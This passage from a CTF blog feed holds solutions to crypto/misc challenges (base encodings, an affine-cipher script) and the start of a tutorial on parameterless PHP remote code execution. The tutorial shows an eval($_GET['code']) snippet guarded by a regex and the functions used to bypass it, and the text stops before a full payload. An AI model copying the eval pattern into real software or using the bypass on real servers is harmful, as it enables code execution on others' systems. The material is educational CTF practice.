punctuation">&#125;</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">:</span>count <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> j <span class="token keyword">in</span> line<span class="token punctuation">:</span>find_line <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>j<span class="token punctuation">)</span>count <span class="token operator">+=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>find_line<span class="token punctuation">)</span>result<span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> countres <span class="token operator">=</span> <span class="token builtin">sorted</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>key<span class="token operator">=</span><span class="token keyword">lambda</span> item<span class="token punctuation">:</span>item<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>reverse<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>num <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">for</span> x <span class="token keyword">in</span> res<span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'频数第&#123;0&#125;: '</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span>x<span class="token punctuation">)</span>num <span class="token operator">+=</span> <span class="token number">1</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p>前16高频字符为</p><pre class="line-numbers language-none"><code class="language-none">etaonrhsidluygw<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">QW8obWdIWT9pMkF-sd5RESQWtRQjVfXiE&#x2F;WSFTajBtcw&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编码后缀符号为<code>=</code>，猜测是base64</p><p>但标准base64只有64个字符（英文大小写、数字和+、/）以及用作后缀等号，并没有<code>r=-sd</code>的<code>-</code>，查了下发现题目出错了</p><p><img src="https://s3.ax1x.com/2020/12/23/ryWqeJ.png"></p><p>所以是</p><pre class="line-numbers language-none"><code class="language-none">QW8obWdIWT9pMkFSQWtRQjVfXiE&#x2F;WSFTajBtcw&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>base64解码后得到</p><pre class="line-numbers language-none"><code class="language-none">Ao(mgHY?i2ARAkQB5_^!?Y!Sj0ms<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>base85解码后得到</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;have_a_good_day1&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h2 id="耗子尾汁"><a href="#耗子尾汁" class="headerlink" title="耗子尾汁"></a>耗子尾汁</h2><p>题目：SWPUCTF 2020</p><p>参考：<a href="https://www.cnblogs.com/LEOGG321/archive/2004/01/13/14094598.html">SWPUCTF2020 Misc题解</a></p><p>文件：<code>hzwz.gif</code></p><p><img src="https://s3.ax1x.com/2020/12/23/ryfyfx.png"></p><p>binwalk提取一下，得到4个文件</p><p><img src="https://s3.ax1x.com/2020/12/23/ryhn41.png"></p><p><code>flag.txt</code>没有flag</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;Th1s_1s_fa1se_f1ag&#125;上来就分离我合成的gif  这好吗？这不好！啪的一下  很快啊  我全都防住了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>2^4_2^5_2^6.mp4</code>为闪电五连鞭的视频，中间有一帧画面有东西</p><blockquote><p><code>63E3A.zip</code>和<code>63F5F.zip</code>解压出来就是<code>2^4_2^5_2^6.mp4</code></p></blockquote><p><img src="https://s3.ax1x.com/2020/12/23/ry4BJ1.png"></p><pre class="line-numbers language-none"><code class="language-none">c2lnbl9pbg&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>base64解码为</p><pre class="line-numbers language-none"><code class="language-none">sign_in<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>把<code>2^4_2^5_2^6.mp4</code>拖到010editor，发现文件尾有个PK开头的压缩包，复制另存为1.zip</p><blockquote><p>也可以用kali自带的binwalk提取</p></blockquote><p><img src="https://s3.ax1x.com/2020/12/23/rcAtr6.png"></p><p>解压需要密码，将<code>sign_in</code>作为密码，解压得到19_20.txt</p><pre class="line-numbers language-none"><code class="language-none">R1pCVE9OUlhHVTNES05SWkdZWVRNUVJYSEEzVEtOUlVHNFpUT09KWEdFM0RLTlJZRzRaVE9RSlhHRTNEUU5aWkdaQkRNTlpXRzQzVEdOWlpHNDRUTVFaV0lJM1RNTlpXR1k0UT09PT0&#x3D;&#x2F;&#x2F;The last layer is the single table replacement password<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>翻译：最后一层是单表替换密码</p></blockquote><p>base64解码得到</p><pre class="line-numbers language-none"><code class="language-none">GZBTONRXGU3DKNRZGYYTMQRXHA3TKNRUG4ZTOOJXGE3DKNRYG4ZTOQJXGE3DQNZZGZBDMNZWG43TGNZZG44TMQZWII3TMNZWGY4Q&#x3D;&#x3D;&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>base32解码</p><pre class="line-numbers language-none"><code class="language-none">6C76756569616B7875647379716568737A7168796B67677379796C6B767669<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>十六进制转字符</p><pre class="line-numbers language-none"><code class="language-none">lvueiakxudsyqehszqhykggsyylkvvi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><p><code>19_20.txt</code>说最后一层是单表替换密码，而仿射密码是一种表单代换密码</p><p>根据文件名，设a=19，b=20</p><p>使用脚本进行仿射密码解密</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token string">"lvueiakxudsyqehszqhykggsyylkvvi"</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span>a <span class="token operator">=</span> <span class="token number">19</span>b <span class="token operator">=</span> <span class="token number">20</span><span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> b <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        k <span class="token operator">=</span> a <span class="token operator">//</span>b        remainder <span class="token operator">=</span> a <span class="token operator">%</span> b        x1<span class="token punctuation">,</span> y1 <span class="token operator">=</span> get<span class="token punctuation">(</span>b<span class="token punctuation">,</span> remainder<span class="token punctuation">)</span>        x<span class="token punctuation">,</span> y <span class="token operator">=</span>y1<span class="token punctuation">,</span> x1 <span class="token operator">-</span> k <span class="token operator">*</span> y1    <span class="token keyword">return</span> x<span class="token punctuation">,</span> yx<span class="token punctuation">,</span> y <span class="token operator">=</span> get<span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">)</span>a1 <span class="token operator">=</span> x <span class="token operator">%</span> <span class="token number">26</span> l<span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">:</span>    cipher <span class="token operator">=</span> a1 <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span> <span class="token number">65</span> <span class="token operator">-</span> b<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span>    res<span class="token operator">=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>cipher <span class="token operator">+</span> <span class="token number">65</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到</p><pre class="line-numbers language-none"><code class="language-none">flagyouhavesignedinsuccessfully<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>根据题目提示：flag格式flag{xxx_xxxx_xxxxxx_xx_xxxxxxxxxxxx}</p><p>加上下划线，得到flag</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;you_have_signed_in_successfully&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>附：</p><p>仿射密码解密原始脚本：<a href="https://blog.csdn.net/x_yhy/article/details/83756908">仿射密码解密（Affine Cipher）</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#仿射密码解密</span><span class="token comment">#改进欧几里得算法求线性方程的x与y</span><span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> b <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        k <span class="token operator">=</span> a <span class="token operator">//</span>b        remainder <span class="token operator">=</span> a <span class="token operator">%</span> b        x1<span class="token punctuation">,</span> y1 <span class="token operator">=</span> get<span class="token punctuation">(</span>b<span class="token punctuation">,</span> remainder<span class="token punctuation">)</span>        x<span class="token punctuation">,</span> y <span class="token operator">=</span>y1<span class="token punctuation">,</span> x1 <span class="token operator">-</span> k <span class="token operator">*</span> y1    <span class="token keyword">return</span> x<span class="token punctuation">,</span> y s <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入解密字符："</span><span class="token punctuation">)</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span>a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入a："</span><span class="token punctuation">)</span><span class="token punctuation">)</span>b <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入b："</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#求a关于26的乘法逆元</span>x<span class="token punctuation">,</span> y <span class="token operator">=</span> get<span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">)</span>a1 <span class="token operator">=</span> x <span class="token operator">%</span> <span class="token number">26</span> l<span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">:</span>    cipher <span class="token operator">=</span> a1 <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span> <span class="token number">65</span> <span class="token operator">-</span> b<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span>    res<span class="token operator">=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>cipher <span class="token operator">+</span> <span class="token number">65</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无参数RCE</title>
      <link href="posts/20201203.html"/>
      <url>posts/20201203.html</url>
      
        <content type="html"><![CDATA[<p>无参数RCE：只使用函数，且函数不能带有参数</p><span id="more"></span><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h3><ul><li>语法：</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword type-declaration">mixed</span> <span class="token function">preg_replace </span><span class="token punctuation">(</span> <span class="token keyword type-hint">mixed</span> <span class="token variable">$pattern</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">mixed</span> <span class="token variable">$replacement</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">mixed</span> <span class="token variable">$subject</span> <span class="token punctuation">[</span><span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$limit</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">[</span><span class="token punctuation">,</span> <span class="token keyword type-declaration">int</span> <span class="token operator">&amp;</span><span class="token variable">$count</span> <span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>pattern</code>：要搜索的模式，可以是字符串或一个字符串数组</p><p><code>replacement</code>：用于替换的字符串或字符串数组</p><p><code>subject</code>：要搜索替换的目标字符串或字符串数组</p><p><code>limit</code>：可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）</p><p><code>count</code>：可选，为替换执行的次数</p><ul><li>简化为：</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">preg_replace</span><span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> replacement<span class="token punctuation">,</span> subject<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即：将<code>subject</code>中符合<code>pattern</code>的替换为<code>replacement</code></p><p>对于<code>preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])</code></p><p>意思是，对传进来的code进行正则匹配，符合正则表达式的部分替换为空，然后返回一个新的字符串</p><h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><p>正则表达式（Regular Expression）描述了一种字符串匹配的模式（pattern），可以用来检查一个串是否含有某种子串、将匹配的子串替换或者从某个串中取出符合某个条件的子串等。</p><p><a href="https://www.runoob.com/regexp/regexp-syntax.html">正则表达式 – 语法 | 菜鸟教程 (runoob.com)</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$str</span><span class="token operator">=</span><span class="token string single-quoted-string">'01ABcdEf_230G'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/0/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'A'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span>    <span class="token comment">//将0换成A</span><span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[0-9]/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span> <span class="token comment">//去掉所有数字</span><span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z]/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span> <span class="token comment">//去掉所有小写字母</span><span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[A-Z]/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span> <span class="token comment">//去掉所有大写字母</span><span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^A-Z]/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span> <span class="token comment">//去掉除了大写字母外所有的字符</span><span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z A-Z]/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token comment">//去掉所有大小写字母</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>A1ABcdEf_23AG<br>ABcdEf_G<br>01ABE_230G<br>01cdf_230<br>ABEG<br>01_230<br></p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"abcABC123_+-*/"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\w]/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'!'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\W]/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'!'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;hr>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^\W]/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'!'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>!!!!!!!!!!+-<em>/<br>abcABC123_!!!!<br>!!!!!!!!!!+-</em>/<br></p></blockquote><p><code>\w</code>：匹配字母、数字、下划线。等价于<code>[A-Z a-z 0-9 _]</code></p><p><code>\W</code>：匹配非字母、数字、下划线。等价于<code>[^A-Z a-z 0-9 _]</code></p><p>而<code>(?R)</code>是引用当前表达式的意思，即可以用<code>/[^\W]+\((?R)?\)/</code>替换到<code>(?R)</code>的位置</p><p><code>(?R)?</code> 这里多一个?表示可以有引用，也就是说可以衍生匹配。</p><p>即：<code>(?R)?</code>表示递归整个匹配模式</p><p>所以<code>/[^\W]+\((?R)?\)/</code>合起来就是匹配无参数的函数，函数内部可以无限嵌套相同的模式，也就是说只匹配<code>字符串+()</code>的类型，并且括号内为<code>空字符串</code>或<code>字符串+()</code>。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>所以对于<code>preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])</code></p><p>像<code>fun1(fun2(fun3()))</code>最终会被替换为空</p><p>而<code>fun1(fun2(fun3(aaa)))</code>则不会进行替换，结果仍为<code>fun1(fun2(fun3(aaa)))</code></p><p><img src="https://s3.ax1x.com/2020/11/26/DBRnKg.png"></p><br><h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><h3 id="show-source"><a href="#show-source" class="headerlink" title="show_source()"></a>show_source()</h3><p>扩展：highlight_file() 高亮读取文件</p><pre class="line-numbers language-none"><code class="language-none">show_source()函数对文件进行语法高亮提示show_source(filename,return)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">filename</td><td align="left">必需。要进行高亮处理的 PHP 文件的路径。</td></tr><tr><td align="left">return</td><td align="left">可选。如果设置 true，则本函数返回高亮处理的代码。</td></tr></tbody></table><ul><li>test.php</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token constant">__FILE__</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;hr>"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s1.ax1x.com/2020/08/17/dZ6b9J.png"></p><h3 id="localeconv"><a href="#localeconv" class="headerlink" title="localeconv()"></a>localeconv()</h3><p>localeconv() 函数返回一包含本地数字及货币格式信息的数组，且第一个元素为点（.)。</p><p>localeconv() 函数会返回以下数组元素：</p><ul><li>[decimal_point] - 小数点字符</li><li>[thousands_sep] - 千位分隔符</li><li>[int_curr_symbol] - 货币符号 （例如：USD）</li><li>[currency_symbol] - 货币符号 （例如：$）</li><li>[mon_decimal_point] - 货币小数点字符</li><li>[mon_thousands_sep] - 货币千位分隔符</li><li>[positive_sign] - 正值字符</li><li>[negative_sign] - 负值字符</li><li>[int_frac_digits] - 国际通用小数位</li><li>[frac_digits] - 本地通用小数位</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>array(18) {<br>  [“decimal_point”]=&gt;<br>  string(1) “.”<br>  [“thousands_sep”]=&gt;<br>  string(0) “”<br>  [“int_curr_symbol”]=&gt;<br>  string(0) “”<br>  [“currency_symbol”]=&gt;<br>  string(0) “”<br>  [“mon_decimal_point”]=&gt;<br>  string(0) “”<br>  [“mon_thousands_sep”]=&gt;<br>  string(0) “”<br>  [“positive_sign”]=&gt;<br>  string(0) “”<br>  [“negative_sign”]=&gt;<br>  string(0) “”<br>  [“int_frac_digits”]=&gt;<br>  int(127)<br>  [“frac_digits”]=&gt;<br>  int(127)<br>  [“p_cs_precedes”]=&gt;<br>  int(127)<br>  [“p_sep_by_space”]=&gt;<br>  int(127)<br>  [“n_cs_precedes”]=&gt;<br>  int(127)<br>  [“n_sep_by_space”]=&gt;<br>  int(127)<br>  [“p_sign_posn”]=&gt;<br>  int(127)<br>  [“n_sign_posn”]=&gt;<br>  int(127)<br>  [“grouping”]=&gt;<br>  array(0) {<br>  }<br>  [“mon_grouping”]=&gt;<br>  array(0) {<br>  }<br>}</p></blockquote><h3 id="pos"><a href="#pos" class="headerlink" title="pos()"></a>pos()</h3><p>pos() 函数返回数组中的当前元素的值（取第一个元素）。</p><p>该函数是 <a href="https://www.w3school.com.cn/php/func_array_current.asp">current()</a> 函数的别名。</p><p>如果pos()和current()都被过滤了，可以使用reset()。</p><p>每个数组中都有一个内部的指针指向它的”当前”元素，初始指向插入到数组中的第一个元素。</p><p>相关的方法：</p><ul><li><a href="https://www.w3school.com.cn/php/func_array_current.asp">current()</a> - 返回数组中的当前元素的值</li><li><a href="https://www.w3school.com.cn/php/func_array_end.asp">end()</a> - 将内部指针指向数组中的最后一个元素，并输出</li><li><a href="https://www.w3school.com.cn/php/func_array_next.asp">next()</a> - 将内部指针指向数组中的下一个元素，并输出</li><li><a href="https://www.w3school.com.cn/php/func_array_prev.asp">prev()</a> - 将内部指针指向数组中的上一个元素，并输出</li><li><a href="https://www.w3school.com.cn/php/func_array_reset.asp">reset()</a> - 将内部指针指向数组中的第一个元素，并输出</li><li><a href="https://www.w3school.com.cn/php/func_array_each.asp">each()</a> - 返回当前元素的键名和键值，并将内部指针向前移动</li></ul><h3 id="scandir"><a href="#scandir" class="headerlink" title="scandir()"></a>scandir()</h3><p>scandir() 函数返回指定目录中的文件和目录的数组。</p><pre class="line-numbers language-none"><code class="language-none">scandir(directory,sorting_order,context);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>directory</em></td><td align="left">必需。规定要扫描的目录。</td></tr><tr><td align="left"><em>sorting_order</em></td><td align="left">可选。规定排列顺序。默认是 0，表示按字母升序排列。如果设置为 SCANDIR_SORT_DESCENDING 或者 1，则表示按字母降序排列。如果设置为 SCANDIR_SORT_NONE，则返回未排列的结果。</td></tr><tr><td align="left"><em>context</em></td><td align="left">可选。规定目录句柄的环境。<em>context</em> 是可修改目录流的行为的一套选项。</td></tr></tbody></table><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'D:\ant'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://s1.ax1x.com/2020/08/17/dZgcyn.png"></p><h3 id="chr"><a href="#chr" class="headerlink" title="chr()"></a>chr()</h3><p>chr() 函数从指定的 ASCII 值返回字符。</p><p>ASCII 值可被指定为十进制值、八进制值或十六进制值。八进制值被定义为带前置 0，而十六进制值被定义为带前置 0x；</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">61</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span> <span class="token comment">// 十进制</span><span class="token keyword">echo</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">061</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span> <span class="token comment">// 八进制值</span><span class="token keyword">echo</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0x61</span><span class="token punctuation">)</span> <span class="token 